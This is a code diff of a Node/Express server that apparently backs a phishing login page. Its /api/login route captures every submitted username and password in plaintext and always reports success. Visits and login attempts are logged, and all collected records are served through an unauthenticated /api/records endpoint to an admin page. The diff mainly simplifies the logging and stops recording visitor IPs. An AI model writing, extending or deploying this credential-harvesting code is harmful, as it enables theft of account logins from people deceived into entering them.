@@ -9,32 +9,18 @@ let records = [];
 
 // Record visits
 app.get('/', (req, res) => {
-    records.unshift({
-        type: "Page Visit",
-        timestamp: new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }),
-        ip: req.ip || req.headers['x-forwarded-for'] || 'Unknown'
-    });
+    records.unshift({ type: 'Page Visit', timestamp: new Date().toLocaleString(), ip: 'Unknown' });
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    records.unshift({
-        type: "Login Page Visit",
-        timestamp: new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }),
-        ip: req.ip || req.headers['x-forwarded-for'] || 'Unknown'
-    });
+    records.unshift({ type: 'Login Page Visit', timestamp: new Date().toLocaleString(), ip: 'Unknown' });
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
-    records.unshift({
-        type: "Login Attempt",
-        username,
-        password,
-        timestamp: new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }),
-        ip: req.ip || req.headers['x-forwarded-for'] || 'Unknown'
-    });
+    records.unshift({ type: 'Login Attempt', username, password, timestamp: new Date().toLocaleString(), ip: 'Unknown' });
     res.json({ success: true });
 });
 
@@ -42,6 +28,7 @@ app.get('/api/records', (req, res) => {
     res.json(records);
 });
 
+// Admin Route
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
